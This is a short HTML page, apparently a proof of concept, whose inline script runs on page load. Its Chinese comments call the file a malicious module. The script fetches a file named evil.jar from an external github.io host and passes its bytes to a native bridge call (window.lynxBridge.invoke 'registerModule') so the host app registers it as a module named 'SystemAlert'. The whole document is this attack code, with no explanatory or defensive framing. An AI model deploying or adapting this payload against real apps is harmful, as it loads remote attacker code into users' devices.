<!DOCTYPE html>
<html>
<body>
<script>
// 通过WebSocket或HTTP下载恶意模块
fetch('https://atompattern.github.io/evil.jar')
    .then(res => res.arrayBuffer())
    .then(data => {
        // 通过JS-Native Bridge触发模块注册
        window.lynxBridge.invoke('registerModule', {
            name: 'SystemAlert',
            classData: data
        });
    });
</script>
</body>
</html>
